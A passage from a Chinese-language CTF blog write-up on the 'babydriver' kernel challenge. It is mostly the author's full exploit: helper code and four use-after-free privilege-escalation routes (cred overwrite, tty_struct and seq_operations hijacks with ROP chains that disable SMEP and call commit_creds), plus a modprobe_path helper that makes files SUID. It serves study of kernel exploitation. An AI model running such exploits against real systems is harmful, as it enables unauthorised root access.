    r12 = init_cred_addr;
    rbx = 0xffffffff810d238d;
    rbp = (size_t)buf;

    asm volatile (
        "movq %0, %%r15\n\t"
        "movq %1, %%r14\n\t"
        "movq %2, %%r13\n\t"
        "movq %3, %%r12\n\t"
        "movq %4, %%rbp\n\t"
        "movq %5, %%rbx\n\t"
        "movq %7, %%r10\n\t"
        "xorq %%rdi, %%rdi\n\t"
        "movl %6, %%edi\n\t"
        "xorq %%rax, %%rax\n\t"
        "mov %%rsp, %%rsi\n\t"
        "movq $0x100, %%rdx\n\t"
        "syscall\n\t"
        :
        :"r"(r15), "r"(r14), "r"(r13),"r"(r12),"r"(rbp),"r"(rbx), "r"(seq_fd), "r"(r10)
        : "%rax"
    );
}

```

调试截图：

![image-20220315005914468](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315005914468.png)

![image-20220315010005426](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220315010005426.png)

最后完整的`exp`为：

`helpful.h`：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <poll.h>
#include <assert.h>
#include <syscall.h>
#include <pthread.h>
#include <linux/fs.h>
#include <linux/fuse.h>
#include <linux/sched.h>
#include <linux/if_ether.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <ctype.h>

// data
size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
size_t g_vmlinux_base_addr;
size_t *g_buffer;
size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
ssize_t g_process_userfault_running;

#define G_BUFFER_SIZE 0x100000
#define PAGE_SIZE 0x1000

/*
extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;
*/

#define RAW_VMLINUX_BASE_ADDR 0xffffffff81000000
#define GADGETS_OFFSET (g_vmlinux_base_addr - RAW_VMLINUX_BASE_ADDR)

#define GET_GADGET_REAL_ADDR(x) (x + GADGETS_OFFSET)

void __attribute__((constructor)) initial()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    g_buffer = (size_t *)calloc(G_BUFFER_SIZE, 1);
}

void __attribute__((destructor)) finish()
{
    free(g_buffer);
}

void clear_buffer()
{
    if (g_buffer)
    {
        memset(g_buffer, G_BUFFER_SIZE, 0);
    }
}

void info(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;33m*\033[0m] \033[40;33mINFO\033[0m ===> %s\r\n", s);
}

void success(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;32m+\033[0m] \033[40;32mOJBK\033[0m ===> %s\r\n", s);
}

void fail(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m-\033[0m] \033[40;31mFAIL\033[0m ===> %s\r\n", s);
}

void warn(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;34m#\033[0m] \033[40;34mWARN\033[0m ===> %s\r\n", s);
}

void error(const char *fmt, ...)
{
    va_list arg;
    int done;
    char s[0x1000] = {0};
    va_start(arg, fmt);
    done = vsprintf(s, fmt, arg);
    va_end(arg);
    printf("[\033[40;31m!\033[0m] \033[40;31mERROR\033[0m ===> %s\r\n", s);
    exit(-1);
}

void get_shell()
{
    if (getuid() == 0)
    {
        success("Get root shell!!!");
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

void get_shell_si()
{
    system("/bin/sh");
}

static size_t get_shell_ex_flag = 0;
void get_shell_ex()
{
    if (get_shell_ex_flag)
    {
        return;
    }

    if (getuid() == 0)
    {
        success("Get root shell!!!");
        get_shell_ex_flag = 1;
    }
    else
    {
        warn("Get normal shell...");
    }
    system("/bin/sh");
}

// at&t flavor assembly
void save_status()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(g_user_cs), "=r"(g_user_ss), "=r"(g_user_eflags), "=r"(g_user_sp)
        :
        : "memory");
}

void set_root_uid()
{
    if (!g_prepare_kernel_cred_addr || !g_commit_creds_addr)
    {
        error("set prepare_kernel_cred_addr and commit_creds_addr first!");
    }
    char *(*pkc)(int) = g_prepare_kernel_cred_addr;
    void (*cc)(char *) = g_commit_creds_addr;
    (*cc)((*pkc)(0));
}

void *get_mmap_rwx(size_t addr, size_t len)
{
    return mmap((void *)addr, len, 7, 0x22, -1, 0);
}

void show_addr_u64(void *addr, size_t size)
{
    if (size < 8)
    {
        error("size is too small, must be 8 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 8) * 8;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 8)
    {
        printf("0x%016lx: 0x%016lx", (size_t)s, *(size_t *)s);
        s += 8;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%016lx\r\n", *(size_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void show_addr_u32(void *addr, size_t size)
{
    if (size < 4)
    {
        error("size is too small, must be 4 at least!");
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
    size = (size / 4) * 4;
    char *s = (char *)addr;
    for (; s < ((char *)addr) + size; s += 4)
    {
        printf("0x%08lx: 0x%08lx", (size_t)s, *(uint32_t *)s);
        s += 4;
        if (s < ((char *)addr) + size)
        {
            printf("\t0x%08lx\r\n", *(uint32_t *)s);
        }
    }
    printf("\r\n===============show adddress info for [%p]===============\r\n\r\n", addr);
}

void hexdump(void *addr, size_t len)
{

    len &= ~0xf;
    char buf[0x400];
    int printf_len;
    char *tmp;
    for (size_t i = 0; i < len / 0x10; i++)
    {
        memset(buf, 0, 0x400);
        printf_len = 0;

        tmp = (char *)addr + i * 0x10;
        printf_len = sprintf(&buf[printf_len], "+%04x %p: ", i * 0x10, tmp);
        for (size_t j = 0; j < 0x10; j++)
        {
            printf_len += sprintf(&buf[printf_len], "%02x ", (uint8_t)tmp[j]);
        }

        printf_len += sprintf(&buf[printf_len], "| ");
        for (size_t j = 0; j < 0x10; j++)
        {
            char _c = tmp[j];
            if (!isprint(_c))
            {
                _c = '.';
            }
            printf_len += sprintf(&buf[printf_len], "%c", _c);
        }

        puts(buf);
    }
}

void flat(size_t data[], const size_t data_len, size_t *target_addr, size_t *cur_idx)
{
    for (size_t i = 0; i < data_len; i++)
    {
        target_addr[*cur_idx] = data[i];
        ++(*cur_idx);
    }
}

//=====================================userfaultfd======================
struct UserfaultHandlerArg
{
    size_t uffd;
    void (*func)(void *, void *);
    void *func_args;
};

void register_userfault(void *fault_page, void *handler, void (*func)(void *, void *), void *func_args)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    size_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        error("register_userfault: ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        error("register_userfault: ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    struct UserfaultHandlerArg *args = malloc(sizeof(struct UserfaultHandlerArg));
    args->uffd = uffd;
    args->func = func;
    args->func_args = func_args;
    int s = pthread_create(&thr, NULL, handler, (void *)args);
    if (s != 0)
        error("register_userfault: pthread_create");
}

void *userfaultfd_stuck_handler(void *arg)
{
    struct UserfaultHandlerArg *args = (struct ActualArgs *)arg;

    struct uffd_msg msg;
    size_t uffd = args->uffd;
    int nready;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    info("userfaultfd_stuck_handler: start to process userfault");
    if (nready != 1)
    {
        error("userfaultfd_stuck_handler: wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        error("userfaultfd_stuck_handler: msg err");
    }

    char *page = (char *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        error("userfaultfd_stuck_handler: mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    // wait for handler
    while (!g_process_userfault_running)
    {
        sleep(1);
        info("wait...process_userfault_running is not ok!");
    }
    // handler
    if (args->func)
    {
        args->func(page, args->func_args);
    }
    else
    { // copy
        memcpy(page, args->func_args, PAGE_SIZE);
    }

    uc.src = (unsigned long)page;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    info("userfaultfd_stuck_handler: stuck handler done");
    g_process_userfault_running = 0;
    return NULL;
}

void seq_operation_spray(ssize_t *seq_fds, size_t count)
{
    int seq;
    for (size_t i = 0; i < count; i++)
    {
        if ((seq = open("/proc/self/stat", O_RDONLY)) == -1)
        {
            error("seq_operation_spray error!");
        }
        seq_fds[i] = seq;
    }
}

void seq_fds_close(ssize_t *seq_fds, size_t count)
{
    for (size_t i = 0; i < count; i++)
    {
        if (seq_fds[i] > 2) {
            close(seq_fds[i]);
            seq_fds[i] = -1;
        }
    }
}


size_t self_copy(uint8_t c)
{
    size_t res = 0;
    for (size_t i = 0; i < sizeof(size_t); i++)
    {
        res <<= 8;
        res |= c;
    }
    return res;
}

void assign_all_regs()
{
    // in program
    /*
    rax
    rdx
    rcx
    rsi
    rdi
    r8
    r9
    r10
    r11
    rbx
    r12
    g_r15 = 0x6161616161616161;
    g_r14 = 0x6262626262626262;
    g_r13 = 0x6363636363636363;
    g_r12 = 0x6464646464646464;
    g_r11 = 0x6565656565656565;
    g_r10 = 0x6666666666666666;
    g_r9  = 0x6767676767676767;
    g_r8  = 0x6868686868686868;
    g_rbp = 0x6969696969696969;
    g_rbx = 0x6a6a6a6a6a6a6a6a;
    g_rdx = 0x6b6b6b6b6b6b6b6b;
    g_rcx = 0x6c6c6c6c6c6c6c6c;
    g_rax = 0x6d6d6d6d6d6d6d6d;
    g_rsi = 0x6e6e6e6e6e6e6e6e;
    g_rdi = 0x6f6f6f6f6f6f6f6f;
    */
    g_r15 = self_copy('a'); // 0x61
    g_r14 = self_copy('b'); // 0x62
    g_r13 = self_copy('c'); // 0x63
    g_r12 = self_copy('d'); // 0x64
    g_r11 = self_copy('e'); // 0x65
    g_r10 = self_copy('f'); // 0x66
    g_r9  = self_copy('g'); // 0x67
    g_r8  = self_copy('h'); // 0x68
    g_rbp = self_copy('i'); // 0x69
    g_rbx = self_copy('j'); // 0x6a
    g_rdx = self_copy('k'); // 0x6b
    g_rcx = self_copy('l'); // 0x6c
    g_rax = self_copy('m'); // 0x6d
    g_rsi = self_copy('n'); // 0x6e
    g_rdi = self_copy('f'); // 0x6f
}

void prepare_for_modprobe_path(const char *modprobe_path, const char* suid_path)
{
    if (suid_path == NULL) {
        suid_path = "/tmp/rootme";
    }
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    char buf[0x400] = {0};
    sprintf(buf, "echo '#!/bin/sh\nchmod 4777 /flag\nchmod 4777 %s\n' > %s", suid_path, modprobe_path);
	system(buf);
    sprintf(buf, "chmod +x %s", modprobe_path);
	system(buf);
	system("chmod +x /tmp/dummy");
}
```



`exp.c`：

```c
#include "../helpful.h"

extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;

#define DEV_NAME "/dev/babydev"

void baby_alloc(int fd, size_t size) {
    ioctl(fd, 0x10001, size);
}

// UAF 使用cred提权
void exp1()
{
    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0xa8); // sizeof(cred) == 0xa8
    close(fd1);
    pid_t child = fork();
    if (child < 0) {
        error("fork error!");
    } else if (child == 0) {
        // child
        char payload[32] = {0};
        write(fd2, &payload, 32);
        get_shell();
    } else {
        wait(NULL);
    }
    return 0;
}

// 使用tty结构体 + ret2usr提权
void exp2()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x2e0); // sizeof(tty_struct) == 0x2e0
    close(fd1);
    int tty_fd = open("/dev/ptmx", 2);
    if (tty_fd < 0) {
        error("open /dev/ptmx error!");
    }
    /*
    0xffffffff8100008a : xchg eax, esp ; ret
    0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; ret
    0xffffffff81171045 : pop rsp ; ret
    0xffffffff81004d80 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff810d238d : pop rdi ; ret
    0xffffffff81063694 : swapgs ; pop rbp ; ret
    0xffffffff814e35ef: iretq; ret;

    */
   size_t tmp = 0xdeadbeef;

    size_t rop_payload [] = {
        0xffffffff810d238d,  //pop rdi ; ret
        0x6f0,
        0xffffffff81004d80, // mov cr4, rdi ; pop rbp ; ret
        ((size_t)&tmp) + 0x1000, // rbp
        (size_t)&set_root_uid,
        0xffffffff81063694, ((size_t)&tmp) + 0x1000, // swapgs ; pop rbp ; ret
        0xffffffff814e35ef, // iretq; ret;
        (size_t)&get_shell,
        g_user_cs,
        g_user_eflags,
        g_user_sp,
        g_user_ss
    };

    // 准备好 tty_operations
    size_t fake_tty_operations [30] = {
        0xffffffff81171045, // pop rsp ret
        (size_t)rop_payload,
        0,0,0,0,0, 0xffffffff8181bfc5 // mov rsp, rax ; dec ebx ; ret
    };

    size_t fake_tty_struct[4] = {0};
    info("fake_tty_operations address: %p\tfake_tty_struct address: %p", fake_tty_operations, fake_tty_struct);

    // 修改 tty_operations
    read(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    write(tty_fd, fake_tty_struct, 0x20);
}


// 使用tty结构体 构造rop执行
void exp3()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x2e0); // sizeof(tty_struct) == 0x2e0
    close(fd1);
    int tty_fd = open("/dev/ptmx", 2);
    if (tty_fd < 0) {
        error("open /dev/ptmx error!");
    }
    /*
    0xffffffff8100008a : xchg eax, esp ; ret
    0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; ret
    0xffffffff81171045 : pop rsp ; ret
    0xffffffff81004d80 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff810d238d : pop rdi ; ret
    0xffffffff81063694 : swapgs ; pop rbp ; ret
    0xffffffff814e35ef: iretq; ret;
    0xffffffff81246ab1: mov rdi, rax; call rcx; pop rbp; ret;
    0xffffffff8100700c: pop rcx; ret;
    */
   size_t tmp = 0xdeadbeef;


    size_t rop_payload [] = {
        0xffffffff810d238d,  //pop rdi ; ret
        0,
        g_prepare_kernel_cred_addr,
        0xffffffff8100700c,
        g_commit_creds_addr,
        0xffffffff81246ab1, ((size_t)&tmp) + 0x1000,
        0xffffffff81063694, ((size_t)&tmp) + 0x1000, // swapgs ; pop rbp ; ret
        0xffffffff814e35ef, // iretq; ret;
        (size_t)&get_shell,
        g_user_cs,
        g_user_eflags,
        g_user_sp,
        g_user_ss
    };
    // 准备好 tty_operations
    size_t fake_tty_operations [30] = {
        0xffffffff81171045, // pop rsp ret
        (size_t)rop_payload,
        0,0,0,0,0, 0xffffffff8181bfc5 // mov rsp, rax ; dec ebx ; ret
    };

    size_t fake_tty_struct[4] = {0};
    info("fake_tty_operations address: %p\tfake_tty_struct address: %p", fake_tty_operations, fake_tty_struct);

    // 修改 tty_operations
    read(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    write(tty_fd, fake_tty_struct, 0x20);
}

// exp4
// seq_operation
void exp_seq()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;
    size_t init_cred_addr = 0xffffffff81e48c60;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x20); // sizeof(seq_operation) 0x18
    close(fd1);
    int seq_fd = open("/proc/self/stat", O_RDONLY);
    if (seq_fd < 0) {
        error("open /proc/self/stat fail!");
    }

    size_t* buf = (size_t *)g_buffer+0x10000;
    int i = 0;
    // buf[i++] = 0xffffffff810d238d;
    // buf[i++] = init_cred_addr;
    // buf[i++] = g_commit_creds_addr;
    buf[i++] = 0xffffffff81063694;
    buf[i++] = ((size_t)buf) + 0x1000;
    buf[i++] = 0xffffffff814e35ef;
    buf[i++] = (size_t)&get_shell_ex;
    buf[i++] = g_user_cs;
    buf[i++] = g_user_eflags;
    buf[i++] = g_user_sp;
    buf[i++] = g_user_ss;


    // 0xffffffff816d749b: add rsp, 0x108; pop rbx; pop r12; pop rbp; ret; 
    // 0xffffffff81008f38: add rsp, 0x18; pop rbx; pop rbp; ret; 
    // 0xffffffff81171045: pop rsp; ret; 
    uint64_t payload[4] = {0xffffffff816d749b};
    write(fd2, payload, 0x8);
    size_t r15, r14, r13, r12, rbp, rbx, r11, r10, r9 ,r8, tmp;
    r15 = 0xffffffff81008f38;
    r14 = 0xffffffff81171045;
    r13 = g_commit_creds_addr;
    r12 = init_cred_addr;
    rbx = 0xffffffff810d238d;
    rbp = (size_t)buf;

    asm volatile (
        "movq %0, %%r15\n\t"
        "movq %1, %%r14\n\t"
        "movq %2, %%r13\n\t"
        "movq %3, %%r12\n\t"
        "movq %4, %%rbp\n\t"
        "movq %5, %%rbx\n\t"
        "movq %7, %%r10\n\t"
        "xorq %%rdi, %%rdi\n\t"
        "movl %6, %%edi\n\t"
        "xorq %%rax, %%rax\n\t"
        "mov %%rsp, %%rsi\n\t"
        "movq $0x100, %%rdx\n\t"
        "syscall\n\t"
        :
        :"r"(r15), "r"(r14), "r"(r13),"r"(r12),"r"(rbp),"r"(rbx), "r"(seq_fd), "r"(r10)
        : "%rax"
    );


}

int main()
{
    // signal(SIGABRT, &get_shell_ex);
    // signal(SIGSEGV, &get_shell_ex);
    exp_seq();
}
```



## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-03-12-kernel-pwn-babydriver/  

